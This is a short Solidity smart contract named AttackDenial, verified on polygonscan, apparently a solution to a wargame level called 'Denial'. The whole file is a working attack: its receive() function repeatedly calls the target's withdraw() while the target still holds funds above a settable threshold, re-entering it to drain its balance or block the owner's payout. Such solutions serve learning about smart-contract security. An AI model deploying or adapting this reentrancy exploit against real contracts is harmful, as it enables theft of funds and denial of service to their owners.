/**
 *Submitted for verification at polygonscan.com on 2023-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {
    function withdraw() external;
}

contract AttackDenial {
    Denial dn;
    uint256 public range = 100;

    constructor(address payable dnAddr) {
        dn = Denial(dnAddr);
    }

    function setWithdrawPartner(uint256 _range) public {
        range = _range;
    }

    receive() external payable {
        uint256 amountToSend = address(dn).balance;
        if (amountToSend > range) {
            dn.withdraw();
        }
    }
}